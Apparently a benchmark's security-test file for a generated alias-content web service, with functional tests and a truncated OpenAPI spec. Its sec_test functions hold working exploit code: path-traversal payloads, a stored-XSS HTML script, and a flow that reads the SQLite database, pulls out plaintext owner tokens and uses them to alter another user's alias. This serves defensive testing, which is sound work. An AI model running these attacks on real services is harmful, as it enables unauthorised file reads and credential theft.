# flake8: noqa
# isort: skip_file
import uuid

from exploits import (
    place_file_on_docker,
    test_sqlite_db_created,
)

generate_marker = lambda: uuid.uuid4().hex
# import libraries
from typing import Optional, Tuple

import requests

import cwes
from scenarios.base import AppInstance

TIMEOUT = 5.0


def base_url(app: AppInstance) -> str:
    return f"http://localhost:{app.port}"


def create_inline_alias(app: AppInstance, slug: str, text: str) -> requests.Response:
    url = f"{base_url(app)}/aliases"
    headers = {"Accept": "application/json"}
    payload = {"slug": slug, "mode": "inline", "text": text}
    return requests.post(url, headers=headers, json=payload, timeout=TIMEOUT)


def get_alias_content(app: AppInstance, slug: str) -> requests.Response:
    url = f"{base_url(app)}/aliases/{slug}/content"
    headers = {"Accept": "application/octet-stream"}
    return requests.get(url, headers=headers, timeout=TIMEOUT)


def update_inline_alias(
    app: AppInstance, slug: str, owner_token: str, text: str
) -> requests.Response:
    url = f"{base_url(app)}/aliases/{slug}"
    headers = {"X-Owner-Token": owner_token, "Accept": "application/json"}
    payload = {"mode": "inline", "text": text}
    return requests.put(url, headers=headers, json=payload, timeout=TIMEOUT)


def parse_creation_response(resp: requests.Response) -> Optional[Tuple[str, str]]:
    try:
        data = resp.json()
    except Exception:
        return None
    slug = data.get("slug")
    owner_token = data.get("ownerToken")
    if isinstance(slug, str) and isinstance(owner_token, str) and owner_token:
        return slug, owner_token
    return None


# import other libraries
# additional helper code not given already


def create_file_alias(app, slug: str, path: str) -> requests.Response:
    url = f"{base_url(app)}/aliases"
    headers = {"Accept": "application/json"}
    payload = {"slug": slug, "mode": "file", "path": path}
    return requests.post(url, headers=headers, json=payload, timeout=TIMEOUT)


def update_file_alias(app, slug: str, owner_token: str, path: str) -> requests.Response:
    url = f"{base_url(app)}/aliases/{slug}"
    headers = {"X-Owner-Token": owner_token, "Accept": "application/json"}
    payload = {"mode": "file", "path": path}
    return requests.put(url, headers=headers, json=payload, timeout=TIMEOUT)


def try_get_content_equals_marker(app, slug: str, marker: str) -> bool:
    resp = get_alias_content(app, slug)
    if resp.status_code != 200:
        return False
    return resp.content == marker.encode("utf-8")


def attempt_via_creation_then_update_bypass(
    app, slug_prefix: str, candidate_path: str, marker: str
) -> bool:
    logger = app.logger
    # First, try direct creation with file mode
    slug = f"{slug_prefix}-{generate_marker()[:8]}"
    logger.info(
        f"Trying direct file alias creation for slug={slug} path={candidate_path!r}"
    )
    resp = create_file_alias(app, slug, candidate_path)
    if resp.status_code == 201:
        logger.info(f"Created file alias slug={slug}; attempting to resolve content")
        if try_get_content_equals_marker(app, slug, marker):
            logger.info("Path traversal succeeded via direct creation")
            return True
        logger.debug("Direct creation resolve did not match marker; continuing")
    else:
        logger.debug(
            f"Direct file alias creation rejected (status={resp.status_code}); will try update bypass"
        )

    # Fallback: create inline alias, then update to file mode with candidate_path
    slug_upd = f"{slug_prefix}-upd-{generate_marker()[:8]}"
    logger.info(f"Creating inline alias for update-bypass slug={slug_upd}")
    resp_create_inline = create_inline_alias(app, slug_upd, "placeholder")
    if resp_create_inline.status_code != 201:
        logger.debug(
            f"Inline alias creation failed (status={resp_create_inline.status_code}); cannot try update-bypass for this path"
        )
        return False

    parsed = parse_creation_response(resp_create_inline)
    if not parsed:
        logger.debug(
            "Failed to parse inline creation response; aborting update-bypass attempt"
        )
        return False
    _, owner_token = parsed
    logger.info(
        f"Updating alias slug={slug_upd} to file mode with path={candidate_path!r}"
    )
    resp_update = update_file_alias(app, slug_upd, owner_token, candidate_path)
    if resp_update.status_code != 200:
        logger.debug(
            f"Update-bypass failed to set file path (status={resp_update.status_code})"
        )
        return False

    logger.info(f"Attempting to resolve updated alias slug={slug_upd}")
    if try_get_content_equals_marker(app, slug_upd, marker):
        logger.info("Path traversal succeeded via update-bypass")
        return True

    logger.debug("Update-bypass resolve did not match marker")
    return False


# import other libraries
# additional helper code not given already
# import other libraries
# additional helper code not given already
import os

# import other libraries
# additional helper code not given already
import uuid
from typing import List, Set

# import other libraries
# additional helper code not given already

SQLITE_HEADER = b"SQLite format 3\0"


def _bytes_starts_with(buf: bytes, prefix: bytes) -> bool:
    return isinstance(buf, (bytes, bytearray)) and buf[: len(prefix)] == prefix


# import other libraries
# additional helper code not given already
import os
import re
import sqlite3
import tempfile
from typing import List, Optional, Set, Tuple


def func_test_create_inline_alias_and_resolve_content(app: AppInstance) -> bool:
    # Create inline alias
    try:
        post_resp = create_inline_alias(app, "hello", "Hello, world!")
    except Exception as e:
        app.logger.exception("POST /aliases request failed: %s", e)
        return False

    if post_resp.status_code != 201:
        app.logger.warning(
            "POST /aliases expected 201, got %d. Body: %s",
            post_resp.status_code,
            post_resp.text,
        )
        return False

    parsed = parse_creation_response(post_resp)
    if not parsed:
        app.logger.warning("POST /aliases returned invalid JSON: %s", post_resp.text)
        return False

    slug, owner_token = parsed
    if slug != "hello" or not isinstance(owner_token, str) or not owner_token:
        app.logger.warning(
            "Unexpected creation response. slug=%s, ownerToken=%s", slug, owner_token
        )
        return False

    # Resolve content
    try:
        get_resp = get_alias_content(app, "hello")
    except Exception as e:
        app.logger.exception("GET /aliases/hello/content request failed: %s", e)
        return False

    if get_resp.status_code != 200:
        app.logger.warning(
            "GET /aliases/hello/content expected 200, got %d. Body: %s",
            get_resp.status_code,
            get_resp.text,
        )
        return False

    expected_bytes = b"Hello, world!"
    if get_resp.content != expected_bytes:
        app.logger.warning(
            "Content mismatch. Expected %r, got %r", expected_bytes, get_resp.content
        )
        return False

    app.logger.info("Alias 'hello' created and resolved correctly.")
    return True


def func_test_create_two_inline_aliases_and_resolve_each(app: AppInstance) -> bool:
    # Create first alias
    try:
        post_alpha = create_inline_alias(app, "alpha", "Alpha content.")
    except Exception as e:
        app.logger.exception("POST /aliases alpha failed: %s", e)
        return False
    if post_alpha.status_code != 201:
        app.logger.warning(
            "POST /aliases (alpha) expected 201, got %d. Body: %s",
            post_alpha.status_code,
            post_alpha.text,
        )
        return False
    parsed_alpha = parse_creation_response(post_alpha)
    if not parsed_alpha or parsed_alpha[0] != "alpha":
        app.logger.warning("Invalid creation response for alpha: %s", post_alpha.text)
        return False

    # Create second alias
    try:
        post_beta = create_inline_alias(app, "beta", "Beta content.")
    except Exception as e:
        app.logger.exception("POST /aliases beta failed: %s", e)
        return False
    if post_beta.status_code != 201:
        app.logger.warning(
            "POST /aliases (beta) expected 201, got %d. Body: %s",
            post_beta.status_code,
            post_beta.text,
        )
        return False
    parsed_beta = parse_creation_response(post_beta)
    if not parsed_beta or parsed_beta[0] != "beta":
        app.logger.warning("Invalid creation response for beta: %s", post_beta.text)
        return False

    # Resolve alpha
    try:
        get_alpha = get_alias_content(app, "alpha")
    except Exception as e:
        app.logger.exception("GET /aliases/alpha/content failed: %s", e)
        return False
    if get_alpha.status_code != 200:
        app.logger.warning(
            "GET /aliases/alpha/content expected 200, got %d. Body: %s",
            get_alpha.status_code,
            get_alpha.text,
        )
        return False
    if get_alpha.content != b"Alpha content.":
        app.logger.warning(
            "Alpha content mismatch. Expected %r, got %r",
            b"Alpha content.",
            get_alpha.content,
        )
        return False

    # Resolve beta
    try:
        get_beta = get_alias_content(app, "beta")
    except Exception as e:
        app.logger.exception("GET /aliases/beta/content failed: %s", e)
        return False
    if get_beta.status_code != 200:
        app.logger.warning(
            "GET /aliases/beta/content expected 200, got %d. Body: %s",
            get_beta.status_code,
            get_beta.text,
        )
        return False
    if get_beta.content != b"Beta content.":
        app.logger.warning(
            "Beta content mismatch. Expected %r, got %r",
            b"Beta content.",
            get_beta.content,
        )
        return False

    app.logger.info("Aliases 'alpha' and 'beta' created and resolved correctly.")
    return True


def func_test_update_inline_alias_and_verify_new_content(app: AppInstance) -> bool:
    # Create alias
    try:
        post_resp = create_inline_alias(app, "note", "Version 1")
    except Exception as e:
        app.logger.exception("POST /aliases note failed: %s", e)
        return False
    if post_resp.status_code != 201:
        app.logger.warning(
            "POST /aliases (note) expected 201, got %d. Body: %s",
            post_resp.status_code,
            post_resp.text,
        )
        return False
    parsed = parse_creation_response(post_resp)
    if not parsed or parsed[0] != "note":
        app.logger.warning("Invalid creation response for note: %s", post_resp.text)
        return False
    owner_token = parsed[1]

    # Verify initial content
    try:
        get_initial = get_alias_content(app, "note")
    except Exception as e:
        app.logger.exception("GET /aliases/note/content initial failed: %s", e)
        return False
    if get_initial.status_code != 200:
        app.logger.warning(
            "GET /aliases/note/content initial expected 200, got %d. Body: %s",
            get_initial.status_code,
            get_initial.text,
        )
        return False
    if get_initial.content != b"Version 1":
        app.logger.warning(
            "Initial content mismatch. Expected %r, got %r",
            b"Version 1",
            get_initial.content,
        )
        return False

    # Update alias content
    try:
        put_resp = update_inline_alias(app, "note", owner_token, "Version 2")
    except Exception as e:
        app.logger.exception("PUT /aliases/note failed: %s", e)
        return False
    if put_resp.status_code != 200:
        app.logger.warning(
            "PUT /aliases/note expected 200, got %d. Body: %s",
            put_resp.status_code,
            put_resp.text,
        )
        return False

    # Verify updated content
    try:
        get_updated = get_alias_content(app, "note")
    except Exception as e:
        app.logger.exception("GET /aliases/note/content after update failed: %s", e)
        return False
    if get_updated.status_code != 200:
        app.logger.warning(
            "GET /aliases/note/content after update expected 200, got %d. Body: %s",
            get_updated.status_code,
            get_updated.text,
        )
        return False
    if get_updated.content != b"Version 2":
        app.logger.warning(
            "Updated content mismatch. Expected %r, got %r",
            b"Version 2",
            get_updated.content,
        )
        return False

    app.logger.info("Alias 'note' updated and resolved with new content correctly.")
    return True


def sec_test_path_traversal(app: AppInstance) -> set[cwes.CWE] | None:
    logger = app.logger
    logger.info("Starting PATH_TRAVERSAL security test for AliasContentRouter")
    target_abs = "/tmp/alias_poc.txt"

    # Prepare marker and stage file on the container
    marker = generate_marker()
    try:
        place_file_on_docker(app.container_id, target_abs, marker)
        logger.info(f"Staged verification file at {target_abs}")
    except Exception as e:
        logger.error(f"Failed to stage verification file inside container: {e}")
        return set()

    # Build candidate paths to try
    traversal_candidates = []
    # Depth variations to reach filesystem root then /tmp/alias_poc.txt
    for depth in range(2, 13):  # try 2..12 "../"
        traversal_candidates.append("../" * depth + "tmp/alias_poc.txt")

    # Optional Windows-style or mixed separators (in case of naive validation)
    traversal_candidates.extend(
        [
            "..\\..\\tmp\\alias_poc.txt",
            "..\\..\\..\\tmp\\alias_poc.txt",
            "../..\\../tmp/alias_poc.txt",
        ]
    )

    # Attempt traversal candidates first (spec-compliant implementations might allow only "relative" paths)
    for cand in traversal_candidates:
        try:
            if attempt_via_creation_then_update_bypass(app, "poc-trav", cand, marker):
                logger.info("Verified arbitrary file read via path traversal")
                return {cwes.CWE.PATH_TRAVERSAL}
        except Exception as e:
            logger.warning(f"Error during traversal attempt with path={cand!r}: {e}")

    # Absolute path fallback (spec forbids, but vulnerable implementations may allow)
    abs_candidates = [target_abs]
    for cand in abs_candidates:
        try:
            if attempt_via_creation_then_update_bypass(app, "poc-abs", cand, marker):
                logger.info("Verified arbitrary file read via absolute path acceptance")
                return {cwes.CWE.PATH_TRAVERSAL}
        except Exception as e:
            logger.warning(
                f"Error during absolute-path attempt with path={cand!r}: {e}"
            )

    logger.info("PATH_TRAVERSAL exploit unsuccessful")
    return set()


def sec_test_xss(app: AppInstance) -> set[cwes.CWE] | None:
    logger = app.logger
    findings: set[cwes.CWE] = set()

    def is_potentially_executable_html(resp: requests.Response) -> bool:
        # Detect only cases where a modern browser would actually render/execute HTML/JS
        headers = {k.lower(): v for k, v in resp.headers.items()}
        ct = headers.get("content-type", "").lower().split(";")[0].strip()
        cd = headers.get("content-disposition", "").lower()
        xcto = headers.get("x-content-type-options", "").lower()

        no_attachment = "attachment" not in cd
        no_nosniff = "nosniff" not in xcto

        prefix = resp.content.lstrip()[:256].lower()
        html_like = any(
            prefix.startswith(sig)
            for sig in [
                b"<!doctype html",
                b"<html",
                b"<head",
                b"<body",
                b"<script",
                b"<?xml",
                b"<svg",
            ]
        )

        # Directly renderable types
        if ct == "text/html" and no_attachment:
            return True
        if ct in ("application/xhtml+xml", "image/svg+xml") and no_attachment:
            return True

        # Sniffable text types without nosniff and HTML-like body
        if (
            ct.startswith("text/")
            and "html" not in ct
            and html_like
            and no_attachment
            and no_nosniff
        ):
            return True

        # Ambiguous/missing type: only consider vulnerable if truly missing (not octet-stream),
        # and sniffing could occur.
        if ct == "" and html_like and no_attachment and no_nosniff:
            return True

        # application/octet-stream should not be treated as renderable by modern browsers
        return False

    try:
        marker = generate_marker()
        sid = marker[:8]
        owned_slug = f"owned-{sid}"
        file_slug = f"view-{sid}"
        inline_slug = f"evil-{sid}"
        poc_filename = f"poc_{sid}.html"
        poc_container_path = f"{app.env.workdir}/{poc_filename}"

        html_payload = f"""<!doctype html>
<html>
<head><meta charset="utf-8"><title>PoC</title></head>
<body>
<script>
try {{
  fetch('/aliases', {{
    method: 'POST',
    headers: {{
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    }},
    body: JSON.stringify({{
      mode: 'inline',
      slug: '{owned_slug}',
      text: 'XSS OK'
    }})
  }}).catch(()=>{{}});
}} catch (e) {{}}
</script>
PoC
</body>
</html>
"""

        # 1) File-based variant
        try:
            place_file_on_docker(
                app.container_id, poc_container_path, html_payload.encode("utf-8")
            )
            logger.info("Placed HTML PoC file in container workdir")
        except Exception as e:
            logger.warning(f"Failed to place PoC file in container: {e!r}")

        vulnerable = False

        try:
            resp_create_file = create_file_alias(app, file_slug, poc_filename)
            logger.info(f"Create file alias status={resp_create_file.status_code}")
            if resp_create_file.status_code == 201:
                resp_content_file = get_alias_content(app, file_slug)
                logger.info(
                    f"GET file-alias content status={resp_content_file.status_code}"
                )
                if (
                    resp_content_file.status_code == 200
                    and is_potentially_executable_html(resp_content_file)
                ):
                    vulnerable = True
        except Exception as e:
            logger.warning(f"File alias path failed: {e!r}")

        # 2) Inline-based variant
        if not vulnerable:
            try:
                resp_create_inline = create_inline_alias(app, inline_slug, html_payload)
                logger.info(
                    f"Create inline alias status={resp_create_inline.status_code}"
                )
                if resp_create_inline.status_code == 201:
                    resp_content_inline = get_alias_content(app, inline_slug)
                    logger.info(
                        f"GET inline-alias content status={resp_content_inline.status_code}"
                    )
                    if (
                        resp_content_inline.status_code == 200
                        and is_potentially_executable_html(resp_content_inline)
                    ):
                        vulnerable = True
            except Exception as e:
                logger.warning(f"Inline alias path failed: {e!r}")

        if vulnerable:
            findings.add(cwes.CWE.XSS)
            logger.info(
                "Stored XSS is plausible: service serves user-controlled content in a browser-executable way"
            )
        else:
            logger.info(
                "Did not observe browser-executable serving of user-controlled content; XSS not confirmed"
            )

        return findings
    except Exception as e:
        logger.error(f"sec_test_xss encountered an error: {e!r}")
        return findings


def sec_test_improper_input_validation(app: AppInstance) -> set[cwes.CWE] | None:
    logger = app.logger
    logger.info(
        "Starting Improper Input Validation (CWE-20) test via path traversal in file-mode aliases"
    )

    # Unique marker used to verify responses; do not log or print it
    marker = generate_marker()

    # Use a separate random suffix for filenames to avoid logging the marker
    suffix = uuid.uuid4().hex[:8]
    workdir = app.env.workdir

    # Prepare multiple parent-depth targets to increase robustness across different CWD/base-dir setups
    depths: List[int] = [1, 2, 3]
    candidate_paths: List[str] = []

    for d in depths:
        try:
            filename = f"poc_{suffix}_d{d}.txt"
            # Place the file outside the presumed allowed directory at increasing depths
            parent_path = os.path.normpath(
                os.path.join(workdir, *([".."] * d), filename)
            )
            place_file_on_docker(app.container_id, parent_path, marker)
            logger.info(f"Prepared target exfiltration file at parent depth {d}")

            # Build traversal candidates to reference the file relative to the server's base/CWD
            base_traversal = "/".join([".."] * d + [filename])
            variants = [
                base_traversal,
                f"./{base_traversal}",
            ]
            # Some light normalization-variation attempts
            if d == 1:
                variants.extend([f".././{filename}", f"..//{filename}"])
            # Deduplicate while preserving order
            for v in variants:
                if v not in candidate_paths:
                    candidate_paths.append(v)
        except Exception as e:
            logger.warning(f"Failed to prepare file at depth {d}: {e}")

    if not candidate_paths:
        logger.error("No candidate traversal paths prepared; aborting test")
        return set()

    # Try each candidate path via direct creation or update-bypass
    for path in candidate_paths:
        logger.info(f"Attempting traversal with candidate path variant: {path!r}")
        try:
            if attempt_via_creation_then_update_bypass(
                app, slug_prefix="leak", candidate_path=path, marker=marker
            ):
                logger.info(
                    "Traversal exploit succeeded; Improper Input Validation confirmed"
                )
                return {cwes.CWE.IMPROPER_INPUT_VALIDATION}
        except Exception as e:
            logger.debug(f"Attempt failed for path {path!r}: {e}")

    logger.info(
        "Traversal attempts did not succeed; Improper Input Validation not confirmed"
    )
    return set()


def sec_test_improper_access_control(app: AppInstance) -> set[cwes.CWE] | None:
    logger = app.logger
    findings: set[cwes.CWE] = set()

    # 1) Seed a file inside the server workdir we can later try to exfiltrate
    marker = generate_marker()  # do not log the marker value
    relative_seed_name = f"poc_{marker}.txt"
    seed_abs_path = f"{app.env.workdir}/{relative_seed_name}"
    try:
        place_file_on_docker(app.container_id, seed_abs_path, marker.encode("utf-8"))
        logger.info("Seeded a proof file into the server workdir for exfiltration test")
    except Exception as e:
        logger.error(f"Failed to place seed file into container: {e}")
        return findings  # cannot proceed

    # Helper to resolve an alias and return content bytes or None
    def resolve(slug: str) -> bytes | None:
        try:
            resp = get_alias_content(app, slug)
        except Exception as e:
            logger.debug(f"GET content failed for slug (suppressed): {e}")
            return None
        if resp.status_code != 200:
            logger.debug(f"GET content returned status={resp.status_code}")
            return None
        return resp.content

    # 2) Attempt direct creation of a file-mode alias pointing at the seeded relative path
    try:
        slug_direct = f"leak-{uuid.uuid4().hex[:10]}"
        resp_create = create_file_alias(app, slug_direct, relative_seed_name)
        logger.info("Attempting direct file alias creation for seeded file")
        if resp_create.status_code == 201:
            content = resolve(slug_direct)
            if content is not None and content == marker.encode("utf-8"):
                logger.info("Verified unprotected file read via direct creation")
                findings.add(cwes.CWE.IMPROPER_ACCESS_CONTROL)
                return findings
        else:
            logger.debug(
                f"Direct file alias creation rejected (status={resp_create.status_code})"
            )
    except Exception as e:
        logger.debug(f"Direct alias creation attempt raised: {e}")

    # 3) Fallback: create inline alias, then update to file mode (bypass via update path)
    try:
        slug_upd = f"leakupd-{uuid.uuid4().hex[:10]}"
        logger.info("Attempting inline-then-update flow to set file path")
        resp_inline = create_inline_alias(app, slug_upd, "placeholder")
        if resp_inline.status_code == 201:
            parsed = parse_creation_response(resp_inline)
            if parsed:
                _, owner_token = parsed
                resp_update = update_file_alias(
                    app, slug_upd, owner_token, relative_seed_name
                )
                if resp_update.status_code == 200:
                    content = resolve(slug_upd)
                    if content is not None and content == marker.encode("utf-8"):
                        logger.info(
                            "Verified unprotected file read via update-to-file bypass"
                        )
                        findings.add(cwes.CWE.IMPROPER_ACCESS_CONTROL)
                        return findings
                else:
                    logger.debug(
                        f"Update to file mode rejected (status={resp_update.status_code})"
                    )
            else:
                logger.debug("Failed to parse inline creation response for owner token")
        else:
            logger.debug(
                f"Inline alias creation failed (status={resp_inline.status_code})"
            )
    except Exception as e:
        logger.debug(f"Inline-then-update flow raised: {e}")

    # 4) Optional: Try to exfiltrate an internal SQLite DB if present (secondary corroboration)
    try:
        if test_sqlite_db_created(app.container_id, app.env, app.logger):
            logger.info(
                "SQLite DB detected; attempting unauthenticated read via file alias"
            )
            db_slug = f"db-{uuid.uuid4().hex[:10]}"
            resp_db_create = create_file_alias(app, db_slug, "db.sqlite3")
            if resp_db_create.status_code == 201:
                db_bytes = resolve(db_slug)
                if db_bytes and _bytes_starts_with(db_bytes, SQLITE_HEADER):
                    logger.info("Confirmed read of internal SQLite database via alias")
                    findings.add(cwes.CWE.IMPROPER_ACCESS_CONTROL)
                    return findings
            else:
                # Fallback: inline-then-update for DB path
                db_upd_slug = f"dbupd-{uuid.uuid4().hex[:10]}"
                resp_db_inline = create_inline_alias(app, db_upd_slug, "placeholder")
                if resp_db_inline.status_code == 201:
                    parsed = parse_creation_response(resp_db_inline)
                    if parsed:
                        _, owner_token = parsed
                        resp_db_update = update_file_alias(
                            app, db_upd_slug, owner_token, "db.sqlite3"
                        )
                        if resp_db_update.status_code == 200:
                            db_bytes = resolve(db_upd_slug)
                            if db_bytes and _bytes_starts_with(db_bytes, SQLITE_HEADER):
                                logger.info(
                                    "Confirmed read of internal SQLite DB via update-to-file bypass"
                                )
                                findings.add(cwes.CWE.IMPROPER_ACCESS_CONTROL)
                                return findings
                        else:
                            logger.debug(
                                f"DB update-to-file rejected (status={resp_db_update.status_code})"
                            )
                else:
                    logger.debug(
                        f"DB inline alias creation failed (status={resp_db_inline.status_code})"
                    )
    except Exception as e:
        logger.debug(f"SQLite exfiltration attempt raised: {e}")

    # If we reach here, the PoC did not succeed
    logger.info("Improper access control PoC did not succeed")
    return findings


def sec_test_insufficiently_protected_credentials(
    app: AppInstance,
) -> set[cwes.CWE] | None:
    logger = app.logger

    def _create_victim_alias() -> Optional[str]:
        # Create a unique victim alias whose token we will later exfiltrate from the DB
        victim_slug = f"victim-{generate_marker()[:8]}"
        logger.info(f"[CWE-522] Creating victim inline alias slug={victim_slug}")
        resp = create_inline_alias(app, victim_slug, "original")
        if resp.status_code != 201:
            logger.warning(
                f"[CWE-522] Failed to create victim alias (status={resp.status_code})"
            )
            return None
        # Deliberately do not use the returned token; we will try to recover it from the DB
        logger.debug("[CWE-522] Victim alias created successfully")
        return victim_slug

    def _create_or_prepare_dump_alias(
        dump_slug: str, initial_path: str
    ) -> Optional[str]:
        # Try to create a file-mode alias directly
        logger.info(
            f"[CWE-522] Attempting to create file alias slug={dump_slug} path={initial_path!r}"
        )
        resp = create_file_alias(app, dump_slug, initial_path)
        if resp.status_code == 201:
            parsed = parse_creation_response(resp)
            if parsed:
                _, owner_token = parsed
                logger.info("[CWE-522] File alias created successfully")
                return owner_token
            logger.debug("[CWE-522] Could not parse creation response for dump alias")

        # Fallback: create inline alias first, then update to file mode using owner token
        logger.info(
            f"[CWE-522] Falling back to create inline alias and update to file mode for slug={dump_slug}"
        )
        resp_inline = create_inline_alias(app, dump_slug, "placeholder")
        if resp_inline.status_code != 201:
            logger.warning(
                f"[CWE-522] Failed to create inline alias for dump (status={resp_inline.status_code})"
            )
            return None
        parsed = parse_creation_response(resp_inline)
        if not parsed:
            logger.warning("[CWE-522] Failed to parse inline alias creation response")
            return None
        _, owner_token = parsed
        logger.info("[CWE-522] Updating inline alias to file mode")
        resp_upd = update_file_alias(app, dump_slug, owner_token, initial_path)
        if resp_upd.status_code != 200:
            logger.debug(
                f"[CWE-522] Could not set initial file path on dump alias (status={resp_upd.status_code})"
            )
        return owner_token

    def _try_fetch_db_bytes(
        dump_slug: str, dump_token: str, candidate_paths: List[str]
    ) -> Optional[bytes]:
        # Try each candidate path; whenever we change it, we use PUT with X-Owner-Token
        for idx, path in enumerate(candidate_paths):
            if idx == 0:
                logger.info(
                    f"[CWE-522] Trying initial path={path!r} on slug={dump_slug}"
                )
            else:
                logger.info(f"[CWE-522] Updating dump alias to path={path!r}")
                resp_upd = update_file_alias(app, dump_slug, dump_token, path)
                if resp_upd.status_code != 200:
                    logger.debug(
                        f"[CWE-522] Update file alias failed for path={path!r} (status={resp_upd.status_code}); trying next"
                    )
                    continue

            resp_get = get_alias_content(app, dump_slug)
            if resp_get.status_code != 200:
                logger.debug(
                    f"[CWE-522] GET content for path={path!r} returned status={resp_get.status_code}"
                )
                continue
            content = resp_get.content
            if _bytes_starts_with(content, SQLITE_HEADER):
                logger.info(f"[CWE-522] Retrieved SQLite DB via path={path!r}")
                return content
            logger.debug(
                f"[CWE-522] Content at path={path!r} does not look like SQLite; size={len(content)} bytes"
            )
        return None

    def _collect_candidate_tokens_from_sqlite(db_bytes: bytes) -> Set[str]:
        tokens: Set[str] = set()
        with tempfile.NamedTemporaryFile(
            prefix="dbdump_", suffix=".sqlite", delete=False
        ) as tf:
            tf.write(db_bytes)
            tmp_path = tf.name
        try:
            conn = sqlite3.connect(tmp_path)
            cur = conn.cursor()
            cur.execute(
                "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'"
            )
            tables = [r[0] for r in cur.fetchall()]
            logger.info(
                f"[CWE-522] Inspecting {len(tables)} table(s) for plaintext tokens"
            )
            for tbl in tables:
                try:
                    cur.execute(f"PRAGMA table_info({tbl})")
                    cols_info = cur.fetchall()
                    col_names = [c[1] for c in cols_info]
                    token_cols = [c for c in col_names if "token" in c.lower()]
                    if not token_cols:
                        continue
                    for tcol in token_cols:
                        try:
                            cur.execute(f"SELECT {tcol} FROM {tbl}")
                            rows = cur.fetchall()
                            for (val,) in rows:
                                if isinstance(val, str) and len(val) >= 8:
                                    tokens.add(val)
                        except Exception as e:
                            logger.debug(
                                f"[CWE-522] Query error table={tbl} col={tcol}: {e}"
                            )
                except Exception as e:
                    logger.debug(
                        f"[CWE-522] PRAGMA table_info failed for table={tbl}: {e}"
                    )

            # Fallback: heuristic search for typical token-like strings in text columns if none found
            if not tokens:
                logger.info(
                    "[CWE-522] No tokens found in '*token*' columns; attempting heuristic scan"
                )
                for tbl in tables:
                    try:
                        cur.execute(f"PRAGMA table_info({tbl})")
                        cols_info = cur.fetchall()
                        text_cols = [
                            c[1]
                            for c in cols_info
                            if c[2].upper() in ("TEXT", "VARCHAR", "CHAR")
                        ]
                        for col in text_cols:
                            try:
                                cur.execute(f"SELECT {col} FROM {tbl}")
                                for (val,) in cur.fetchall():
                                    if isinstance(val, str):
                                        # Heuristic: look for strings resembling tokens, e.g., own_<hex...> or UUID-like
                                        if re.search(
                                            r"\bown_[A-Za-z0-9]{8,}\b", val
                                        ) or re.search(
                                            r"\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b",
                                            val,
                                            re.IGNORECASE,
                                        ):
                                            tokens.add(val)
                            except Exception as e:
                                logger.debug(
                                    f"[CWE-522] Heuristic scan failed for table={tbl} col={col}: {e}"
                                )
                    except Exception as e:
                        logger.debug(
                            f"[CWE-522] PRAGMA table_info failed for table={tbl}: {e}"
                        )
        except Exception as e:
            logger.warning(f"[CWE-522] Failed to open exfiltrated DB as SQLite: {e}")
        finally:
            try:
                if "conn" in locals():
                    conn.close()
            except Exception:
                pass
            try:
                os.unlink(tmp_path)
            except Exception:
                pass

        logger.info(f"[CWE-522] Collected {len(tokens)} token candidate(s) from DB")
        return tokens

    # Begin exploit flow

    # 1) Seed a victim alias so that an owner token exists in the DB
    victim_slug = _create_victim_alias()
    if not victim_slug:
        return set()

    # 2) Prepare a dump alias and attempt to exfiltrate the SQLite DB via file path traversal
    dump_slug = f"dumpdb-{generate_marker()[:8]}"
    candidate_paths = [
        "db.sqlite3",
        "data/db.sqlite3",
        "database.db",
        "database.sqlite3",
        "app.db",
        "storage/db.sqlite3",
        "db/db.sqlite3",
        "../db.sqlite3",
        "../../db.sqlite3",
        "../data/db.sqlite3",
    ]
    dump_token = _create_or_prepare_dump_alias(dump_slug, candidate_paths[0])
    if not dump_token:
        logger.warning("[CWE-522] Could not create/prepare dump alias")
        return set()

    db_bytes = _try_fetch_db_bytes(dump_slug, dump_token, candidate_paths)
    if not db_bytes:
        logger.warning("[CWE-522] Failed to exfiltrate SQLite DB via file alias")
        return set()

    # 3) Parse the DB to find plaintext owner tokens
    candidate_tokens = _collect_candidate_tokens_from_sqlite(db_bytes)
    if not candidate_tokens:
        logger.warning("[CWE-522] No plausible owner tokens found in exfiltrated DB")
        return set()

    # 4) Attempt unauthorized update on the victim alias using exfiltrated tokens
    marker = generate_marker()
    for tok in candidate_tokens:
        logger.info(
            f"[CWE-522] Trying exfiltrated token candidate to update victim slug={victim_slug}"
        )
        resp = update_inline_alias(app, victim_slug, tok, marker)
        if resp.status_code == 200:
            logger.info(
                "[CWE-522] Update accepted with an exfiltrated token; verifying impact"
            )
            if try_get_content_equals_marker(app, victim_slug, marker):
                logger.info(
                    "[CWE-522] Unauthorized update confirmed via leaked plaintext owner token"
                )
                return {cwes.CWE.INSUFFICIENTLY_PROTECTED_CREDENTIALS}
            else:
                logger.debug(
                    "[CWE-522] Post-update content did not match marker; continuing"
                )
        else:
            logger.debug(
                f"[CWE-522] Token candidate rejected (status={resp.status_code}); trying next"
            )

    logger.warning(
        "[CWE-522] Could not perform unauthorized update using any exfiltrated token"
    )
    return set()


_API_SPEC = """
openapi: 3.0.3
info:
  title: AliasContentRouter
  description: Manages readable slugs that map to either inline text or the contents of a relative file path. Clients can create, update, and resolve slugs to retrieve content verbatim.
  version: 1.0.0
paths:
  /aliases:
    post:
      summary: Create a new alias with a unique slug
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/AliasCreateRequest'
      responses:
        '201':
          description: Alias created; owner token returned for future updates
          content:
            application/json:
              schema:
                type: object
                properties:
                  slug:
                    type: string
                    example: "docs/readme"
                  ownerToken:
                    type: string
                    description: Token required to update this alias
                    example: "own_7f3b2c6a0b1e4d9a"
                required:
                  - slug
                  - ownerToken
        '409':
          description: Slug already exists
        '400':
          description: Invalid request
        '422':
          description: Unprocessable request
  /aliases/{slug}:
    put:
      summary: Update an alias’s mode and content
      parameters:
        - in: path
          name: slug
          required: true
          schema:
            type: string
          description: The unique slug to update
        - in: header
          name: X-Owner-Token
          required: true
          schema:
            type: string
          description: Owner token returned when the alias was created
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/AliasUpdateRequest'
      responses:
        '200':
          description: Alias updated
        '403':
          description: Invalid or missing owner token
        '404':
          description: Alias not found
        '400':
          description: Invalid request
        '422':
          description: Unprocessable request
  /aliases/{slug}/content:
    get:
      summary: Resolve a slug and return the stored content verbatim
      parameters:
        - in: path
          name: slug
          required: true
          schema:
            type: string
          description: The slug to resolve
      responses:
        '200':
          description: Content returned verbatim
          content:
            application/octet-stream:
              schema:
                type: string
                format: binary
        '404':
